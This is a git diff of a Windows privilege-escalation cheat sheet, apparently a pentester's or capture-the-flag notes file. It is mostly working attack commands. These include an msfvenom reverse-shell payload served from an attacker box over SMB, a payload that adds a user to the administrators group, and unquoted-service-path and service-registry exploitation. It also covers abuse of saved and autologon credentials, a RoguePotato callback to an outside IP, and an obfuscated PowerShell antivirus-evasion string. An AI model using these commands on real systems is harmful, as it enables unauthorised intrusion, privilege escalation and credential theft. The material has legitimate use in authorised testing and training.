@@ -41,22 +41,20 @@ Careful of x64,x32,x86_64 etc funtimes with windows!
 Extension for AlwaysInstallElevated == msi
 Extension for Dynamic-Linked-Libraries == dll //not done a reverse shell from a dll but maybe possible..
 
-```
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST= $ATTACKBOX LPORT=$PORT -f exe -o reverse.exe
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py $hostdirectory
 copy \\$ATTACKBOX\$hostdirectory\reverse.exe C:\Path\reverse.exe
-
 ```
 
  Drop NC for one liner webserver
 
 ```
 while(1) { cat index.html | nc -w1 -l -p 8080 }         
-
 ```
 
 # General Enumeration:
-```
+```powershell
 setspn -T medin -Q  */*        # extract all accounts in the SPN - service principle name - service and account mapping
 ver                            # get version
 tasklist /svc                  # list all services
@@ -72,8 +70,9 @@ findstr /si string *.extension # find patterns from current directory and recurs
 
 # Driver Queries
 driverquery
-sc query windefend
+sc query windefend # requires NAME use get-ciminstance here for memory
 sc queryex type=service
+get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct
 
 # Hotfix levels
 get-hotfix
@@ -87,9 +86,21 @@ net user # "" insert user name if required with quotes
 get-netuser | out-gridview
 get-netuser | select -expandproperty lastlogon
 (Get-NetUser).name
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+Get-LocalUser -Name "Administrator" | Select Name,SID
+# Logged in
+query user /server:$SERVER
 
+
+# WMi-Obejcts
 Get-WmiObject win32_useraccount | Select name,sid
 gvmi win32_userprofile
+#Get Computer system information
+Get-WMIObject Win32_ComputerSystem
+#Get Computer name from available System information
+Get-WMIObject Win32_ComputerSystem| Select-Object -ExpandProperty Name
+#Get Domain name from available System Information
+Get-WMIObject Win32_ComputerSystem| Select-Object -ExpandProperty Domain
 
 net localgroup # "" insert group name if required with quotes
 Get-Net-Group
@@ -135,7 +146,6 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 (Get-PSReadlineOption).HistorySavePath
 
 # Task related
-
 schtasks /query /fo LIST /v
 
 ```
@@ -149,13 +159,24 @@ net start <service>
 ```
 
 # Unquoted Service Path
+Either 
+```wmic
+wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
 ```
+Meterpreter
+```msfconsole
+use exploit/windows/local/trusted_service_path
+```
+PowerSploit
+
+```powershell
 sc qc unquotedsvc # Query a service that has binary path name that is UNQUOTED AND CONTAINS SPACES
 accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" # sysinternals
 msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe 
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 net start unquotedsvc
 ```
+[Pentestlab](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
 
 # Insecure service executables
 ```
@@ -268,11 +289,17 @@ accesschk.exe -kvqwsu "Users" hklm\system\currentcontrolset\services /accepteula
 accesschk.exe -kvqwsu "Everyone" hklm\system\currentcontrolset\services /accepteula
 ```
 
-#Saved Credentials:
-```
+# Saved Credentials:
+```cmd
 cmdkey /list                                    list saved credentials
 runas /savecred /user:admin reverse_shell.exe   query /savedcred
 ```
+
+Autologon Credentials
+```powershell
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon 
+```
+
 # Password Mining Configuration Files
 ```
 # Look for Unattend.xml used by sysadmins to setup systems, should be deleted.
@@ -338,8 +365,7 @@ icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 ```
 
 # Service Escalation Registry
-```
-# powershell:
+```powershell
 Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 Copy ‘C:\service.c # Edit file, either on box or on attack box, depending on local compiler and noise:
 # replace or add a system() function call to:
@@ -365,7 +391,7 @@ sc start dllsvc # Or start a service that use it.
 ```
 
 # Powershell downgrade
-```
+```powershell
 powershell -version 2
 full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
 ```
@@ -399,7 +425,7 @@ C:\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe # trig
 C:\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999 # in local service reverse shell run exploit
 ``` 
 # Hot Potato
-```
+```powershell
 powershell.exe -nop -ep bypass
 https://github.com/Kevin-Robertson/Tater.git
 Import-Module C:\Path\To\HotPotato.ps1
